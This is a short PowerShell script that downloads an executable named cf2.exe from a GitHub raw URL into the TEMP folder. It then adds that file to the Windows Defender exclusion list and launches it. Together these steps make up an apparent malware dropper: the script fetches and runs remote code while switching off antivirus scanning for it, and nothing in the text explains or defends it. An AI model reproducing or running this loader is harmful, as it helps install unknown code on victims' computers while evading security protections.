$url = 'https://github.com/ct7ybve7f387/tests/raw/refs/heads/main/cf2.exe'
$output = "$env:TEMP\cf2.exe"

# Download the file
Invoke-WebRequest -Uri $url -OutFile $output

# Add the file to Windows Defender exclusions (requires admin privileges)
Add-MpPreference -ExclusionPath $output

# Run the file
Start-Process $output
